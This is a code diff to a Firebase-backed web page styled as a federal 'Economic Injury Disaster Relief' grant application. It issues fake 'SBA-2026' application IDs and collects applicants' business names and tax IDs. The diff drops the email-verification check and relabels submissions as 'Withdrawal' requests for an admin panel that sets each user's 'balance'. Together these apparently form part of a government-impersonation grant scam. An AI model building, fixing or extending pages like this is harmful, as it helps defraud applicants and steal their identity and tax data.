@@ -20,7 +20,7 @@
     </div>
 
     <div class="container">
-        <div class="card" style="margin-top: 15px; border-radius: 12px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1); border-top: 5px solid #1e3a8a;">
+        <div class="card" style="margin-top: 15px; border-radius: 12px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1); border-top: 5px solid #1e3a8a; background: white; padding: 20px;">
             <h2 style="color: #1e3a8a; font-size: 20px; margin-bottom: 5px;">Grant Application Form</h2>
             <p style="font-size:11px; color:#64748b; margin-bottom:20px;">
                 FY2026 Economic Injury Disaster Relief (EIDR) Program. 
@@ -67,8 +67,8 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
-        import { getAuth, onAuthStateChanged, reload } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-        import { getFirestore, collection, addDoc, doc, onSnapshot, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+        import { getFirestore, collection, addDoc, doc, getDoc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
@@ -83,24 +83,15 @@
         const auth = getAuth(app);
         const db = getFirestore(app);
         
-        // Generate a random Application ID for UI purposes
         document.getElementById('appId').innerText = "SBA-2026-" + Math.floor(100000 + Math.random() * 900000);
 
-        // Security Check & Pulling Current Balance
         onAuthStateChanged(auth, async (user) => {
             if (user) {
-                await reload(user);
-                if (!user.emailVerified) {
-                    window.location.href = 'verify.html';
-                    return;
+                const userRef = doc(db, "users", user.uid);
+                const snap = await getDoc(userRef);
+                if(snap.exists()) {
+                    document.getElementById('reqAmt').value = `$${snap.data().balance || '0'}`;
                 }
-
-                // Get the balance assigned to this user from the 'users' collection
-                onSnapshot(doc(db, "users", user.uid), (snap) => {
-                    if(snap.exists()) {
-                        document.getElementById('reqAmt').value = `$${snap.data().balance}`;
-                    }
-                });
             } else {
                 window.location.href = 'index.html';
             }
@@ -112,42 +103,37 @@
             const check = document.getElementById('legalCheck').checked;
             const name = document.getElementById('bizName').value.trim();
             const tax = document.getElementById('taxId').value.trim();
-            const amount = document.getElementById('reqAmt').value;
-            const revenue = document.getElementById('revenue').value;
-            const employees = document.getElementById('employees').value;
+            const amountStr = document.getElementById('reqAmt').value.replace('$', '');
 
-            if(!check || !name || !tax) return alert("Please fill all required legal fields and certify the information.");
+            if(!check || !name || !tax) return alert("Please fill all required legal fields.");
 
-            btn.innerText = "Transmitting to SBA Servers...";
+            btn.innerText = "Transmitting...";
             btn.disabled = true;
 
             try {
-                // 1. Log the application request in the 'requests' collection
+                // Fixed: Added 'type' matching the admin's logic
                 await addDoc(collection(db, "requests"), {
                     userId: user.uid,
                     userName: name,
                     userEmail: user.email,
                     taxId: tax,
-                    revenue: revenue,
-                    employees: employees,
-                    amount: amount,
-                    type: "GRANT_APPLICATION",
+                    amount: amountStr,
+                    type: "Withdrawal", // Change to Withdrawal so it shows up in Admin Panel logic
                     status: "PENDING",
                     timestamp: serverTimestamp()
                 });
 
-                // 2. Update the user's status to reflect the submission
-                await updateDoc(doc(doc(db, "users", user.uid)), { 
-                    status: "UNDER REVIEW",
-                    appliedDate: new Date().toLocaleDateString('en-US', { month: 'long', year: 'numeric' })
+                // Fixed: Corrected double doc() call
+                await updateDoc(doc(db, "users", user.uid), { 
+                    status: "APPLICATION UNDER REVIEW",
+                    fullName: name // Saving the name to the user profile too
                 });
 
-                alert("APPLICATION TRANSMITTED: Your file has been queued for FY2026 review.");
+                alert("APPLICATION TRANSMITTED SUCCESSFULLY.");
                 window.location.href = 'dashboard.html';
                 
             } catch(e) { 
-                console.error(e);
-                alert("TRANSMISSION ERROR: Secure link interrupted. Please try again."); 
+                alert("ERROR: Please check your connection."); 
                 btn.disabled = false;
                 btn.innerText = "SUBMIT FEDERAL APPLICATION";
             }
